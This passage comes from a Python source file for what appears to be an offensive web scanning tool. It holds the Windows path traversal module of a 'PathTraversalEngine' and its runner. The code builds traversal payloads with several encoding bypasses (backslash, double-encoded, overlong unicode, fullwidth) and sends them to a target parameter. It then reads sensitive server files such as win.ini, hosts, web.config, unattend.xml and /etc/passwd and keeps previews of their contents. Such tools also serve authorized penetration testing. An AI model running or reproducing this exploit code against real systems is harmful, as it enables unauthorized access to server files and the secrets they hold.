        if results["details"]["categories_found"]:
            results["details"]["categories_found"] = list(results["details"]["categories_found"])

        self._print(f"[+] Config scan complete: {results['details']['total_found']}/"
                   f"{results['details']['total_tested']} files found", GREEN if results["vulnerable"] else YELLOW)

        return results

    # ========================================================================
    # SCAN: Windows-Specific Path Traversal
    # ========================================================================

    def scan_windows(self, url=None, param=None):
        """Windows-specific path traversal scanning"""
        target_url = url or self.target_url
        parameter = param or self.parameter

        self._print(f"[*] Windows Path Traversal Scanning on {target_url}", CYAN)

        results = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "os_detected": None,
                "windows_version": None,
                "files_read": [],
                "iis_detected": False,
            },
            "scan_type": "path_traversal_windows",
        }

        # Test Windows traversal with both forward and backslash
        win_test_files = [
            ("C:/Windows/win.ini", "windows_ini"),
            ("C:/Windows/System32/drivers/etc/hosts", "windows_hosts"),
            ("C:/boot.ini", None),
        ]

        win_traversal_methods = [
            ("backslash", "..\\"),
            ("forward_slash", "../"),
            ("mixed", "..\\/"),
            ("url_encoded_backslash", "..%5c"),
            ("double_encoded", "..%255c"),
            ("unicode", "..%c0%af"),
            ("fullwidth", "..%ef%bc%8f"),
        ]

        found = False
        for file_path, sig_type in win_test_files:
            if found:
                break
            for method_name, trav_seq in win_traversal_methods:
                if found:
                    break
                for depth in range(1, 8):
                    payload = self._build_traversal(depth, file_path, trav_seq)
                    resp = self._inject_payload_raw(payload, parameter)
                    if resp and resp.status_code == 200:
                        sigs = self._check_signatures(resp.text, sig_type) if sig_type else []
                        content = resp.text.strip()
                        if sigs or (len(content) > 10 and any(
                            k in content.lower() for k in ["[fonts]", "[boot]", "localhost"]
                        )):
                            results["vulnerable"] = True
                            results["details"]["os_detected"] = "Windows"
                            results["findings"].append({
                                "type": "windows_traversal",
                                "file": file_path,
                                "depth": depth,
                                "method": method_name,
                                "traversal_seq": trav_seq,
                                "payload": payload,
                                "signatures": sigs,
                                "content_length": len(content),
                            })
                            results["details"]["files_read"].append({
                                "file": file_path,
                                "size": len(content),
                                "preview": content[:200],
                                "method": method_name,
                            })
                            self._print(f"[+] Windows file read: {file_path} "
                                       f"via {method_name} (depth={depth})", GREEN)
                            found = True
                            break

        # If Windows detected, scan more files
        if results["vulnerable"]:
            self._print(f"[*] Windows confirmed - scanning additional files...", CYAN)
            for file_path in WINDOWS_CONFIG_FILES[:10]:
                for depth in range(1, 7):
                    payload = self._build_traversal(depth, file_path, "..\\")
                    resp = self._inject_payload_raw(payload, parameter)
                    if resp and resp.status_code == 200 and len(resp.text.strip()) > 10:
                        results["details"]["files_read"].append({
                            "file": file_path,
                            "size": len(resp.text),
                            "preview": resp.text[:200],
                        })
                        results["findings"].append({
                            "type": "windows_file_read",
                            "file": file_path,
                            "depth": depth,
                            "content_length": len(resp.text),
                        })
                        self._print(f"    [+] {file_path} ({len(resp.text)} bytes)", GREEN)
                        break

            # Check for IIS
            for depth in range(1, 7):
                payload = self._build_traversal(depth, "C:/inetpub/wwwroot/web.config", "..\\")
                resp = self._inject_payload_raw(payload, parameter)
                if resp and resp.status_code == 200:
                    if "configuration" in resp.text.lower() or "system.web" in resp.text.lower():
                        results["details"]["iis_detected"] = True
                        self._print(f"[+] IIS detected - web.config readable!", GREEN)
                        break

            # Check for Windows version
            for depth in range(1, 7):
                payload = self._build_traversal(depth, "C:/Windows/Panther/unattend.xml", "..\\")
                resp = self._inject_payload_raw(payload, parameter)
                if resp and resp.status_code == 200:
                    version_match = regex_cache.search(r'<osimage>(.*?)</osimage>', resp.text, re.IGNORECASE)
                    if version_match:
                        results["details"]["windows_version"] = version_match.group(1)[:200]
                    break

        if not results["vulnerable"]:
            self._print("[-] No Windows path traversal detected", YELLOW)

        return results

    # ========================================================================
    # MAIN ENTRY POINT
    # ========================================================================

    def run(self, target, scan_type='detect', **kwargs):
        """Main entry point for Path Traversal Engine"""
        if isinstance(target, str):
            if not target.startswith('http'):
                target = f'https://{target}'
            self.target_url = target

        self.parameter = kwargs.get('parameter', self.parameter)
        self.method = kwargs.get('method', self.method)
        self.headers = kwargs.get('headers', self.headers)
        self.cookies = kwargs.get('cookies', self.cookies)
        self.proxy = kwargs.get('proxy', self.proxy)
        self.timeout = kwargs.get('timeout', self.timeout)
        self.threads = kwargs.get('threads', self.threads)

        scan_methods = {
            'detect': lambda: self.detect_traversal(self.target_url, self.parameter),
            'fuzz_depth': lambda: self.fuzz_depth(self.target_url, self.parameter,
                                                    kwargs.get('max_depth', 10)),
            'read_file': lambda: self.read_file(self.target_url, self.parameter,
                                                 kwargs.get('file_path', '/etc/passwd')),
            'bypass_encoding': lambda: self.bypass_encoding(self.target_url, self.parameter),
            'scan_config': lambda: self.scan_config_files(self.target_url, self.parameter),
            'scan_windows': lambda: self.scan_windows(self.target_url, self.parameter),
        }

        if scan_type in scan_methods:
            return scan_methods[scan_type]()
        return {"error": f"Unknown scan type: {scan_type}", "available": list(scan_methods.keys())}


# ============================================================================
# CONVENIENCE RUNNER FUNCTION (Module-level)
# ============================================================================

def run(target, scan_type='detect', **kwargs):
    """Module-level run function for ZYLON integration"""
    engine = PathTraversalEngine()
    return engine.run(target, scan_type=scan_type, **kwargs)
